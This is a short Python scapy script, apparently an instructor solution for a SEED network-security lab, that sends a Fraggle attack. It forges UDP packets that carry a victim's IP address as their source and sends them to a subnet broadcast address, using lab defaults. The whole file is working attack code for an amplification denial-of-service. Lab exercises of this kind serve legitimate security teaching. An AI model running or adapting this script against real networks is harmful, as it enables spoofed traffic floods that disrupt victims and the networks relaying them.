#!/usr/bin/env python3

import argparse
import time
from scapy.all import IP, UDP, Raw, send


def parse_args():
    parser = argparse.ArgumentParser(description="Instructor solution: Fraggle attack sender.")
    parser.add_argument("--victim", default="10.151.0.71")
    parser.add_argument("--broadcast", default="10.152.0.255")
    parser.add_argument("--port", type=int, default=7000)
    parser.add_argument("--count", type=int, default=1)
    parser.add_argument("--interval", type=float, default=0.2)
    parser.add_argument("--payload", default="SEED-FRAGGLE")
    return parser.parse_args()


def main():
    args = parse_args()
    if args.count < 1:
        raise SystemExit("--count must be at least 1")
    if args.port < 1 or args.port > 65535:
        raise SystemExit("--port must be between 1 and 65535")

    packet = (
        IP(src=args.victim, dst=args.broadcast)
        / UDP(sport=args.port, dport=args.port)
        / Raw(load=args.payload.encode())
    )

    for _ in range(args.count):
        send(packet, verbose=0)
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
